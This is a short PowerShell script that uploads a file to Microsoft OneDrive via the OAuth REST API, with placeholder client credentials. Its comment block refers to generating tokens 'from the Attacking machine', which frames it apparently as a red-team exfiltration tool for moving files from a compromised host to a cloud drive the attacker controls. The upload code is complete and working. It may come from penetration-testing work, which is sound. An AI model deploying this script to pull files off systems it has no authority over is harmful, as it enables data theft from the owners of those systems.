<#

DESCRIPTION
This Powershell script will upload a file to Microsoft OneDrive.  You must generate and supply a token for each upload attempt. 
Note - This script is for Powershell V2.  Also, this is a "Simple Item" upload and can only handle files up to 4MB. Tested and works
uploading .txt, .pdf, .docx, .xlsx.

-----------

USAGE
OneDriveUploadPSv2.ps1 MyFileToUpload.txt [one-time token]

-----------

TODO Prior to use 
1.  You will need a OneDrive Application ID (the client_id) and a Password (the client_secret).  To do this, register this app at https://apps.dev.microsoft.com.  You will need the Application ID and Password for this script for it to work.  Registration steps can
be found at https://gallery.technet.microsoft.com/How-to-use-OneDrive-Rest-5b31cf78

-----------

TO Generate Tokens
1.  From the Attacking machine, copy the following URL into a browser.  Add your client_id where indicated:  

https://login.live.com/oauth20_authorize.srf?client_id=YOUR_CLIENT_ID_GOES_HERE&scope=onedrive.readwrite offline_access&response_type=code&redirect_uri=https://localhost

2.  You may be prompted with a "allow this app to access your info" message (or something similiar to this). Click yes to proceed.  

3.  The browser URL field should now contain a new, usable, one-time use token similiar to this:
https://localhost/?code=Mb948a5a7-436c-d77e-f628-fb58eefc6097/

Just copy the string between "=" and "/"      

Remember, a token must be generated for EACH upload attempt.  Tokens are good for 1 hour, afterwards they will need to be regenerated.  

------------

MISC Notes
This script was written for Powershell v2, however successful uploads have been made using this script on PSv3.  YMMV.  

MISC Notes pt 2
This script is based heavily on chowdaryd's Google Drive Uploader.  Thanks man!

#>



Param(
    [Parameter(Mandatory=$true)]
    [string]$SourceFilePath,
    [Parameter(Mandatory=$true)]
    [string]$AccessToken
)

$load_lib = [System.Reflection.Assembly]::LoadWithPartialName("System.Web.Extensions");

<#----------------INITIALIZATION REQUIRED-----------------#>
$ClientID = '501fc5ad-9c9e-49d2-a416-9130dwiseau0';		##########Add your Application ID here
$ClientSecret = '12SUPERSECRETPASSWORD21';			##########Add your Password here
$CallbackURI = 'https://localhost'
<#--------------------------------------------------------#>

$WebRequest = [System.Net.WebRequest]::Create("https://login.live.com/oauth20_token.srf");
$WebRequest.Method = "POST";
$WebRequest.ContentType = "application/x-www-form-urlencoded";

$RequestWriter = [System.IO.StreamWriter] $WebRequest.GetRequestStream();
$RequestWriter.Write("code="+$AccessToken+"&client_id="+$ClientID+"&client_secret="+$ClientSecret+"&redirect_uri="+$CallbackURI+"&grant_type=authorization_code");
$RequestWriter.Close();

$ResponseReader = New-Object System.IO.StreamReader $WebRequest.GetResponse().GetResponseStream();
$tokens = $ResponseReader.ReadToEnd();

$ser = New-Object System.Web.Script.Serialization.JavaScriptSerializer;
$tok = $ser.DeserializeObject($tokens);

$authorization = "Bearer "+ $tok.access_token

$WebRequest1 = [System.Net.WebRequest]::Create("https://api.onedrive.com/v1.0/drive/root:/"+$SourceFilePath+":/content");
$WebRequest1.Method = "PUT";
$WebRequest1.ContentType = "application/octet-stream";
$WebRequest1.Headers.add('Authorization',$authorization);

$FileReader = New-Object System.IO.StreamReader ($SourceFilePath, [System.Text.Encoding]::Default);

$RequestWriter1 = New-Object System.IO.StreamWriter ($WebRequest1.GetRequestStream(), [System.Text.Encoding]::Default);
$RequestWriter1.Write($FileReader.ReadToEnd());
$RequestWriter1.Close();

$ResponseReader1 = New-Object System.IO.StreamReader $WebRequest1.GetResponse().GetResponseStream();
$ResponseReader1.ReadToEnd();
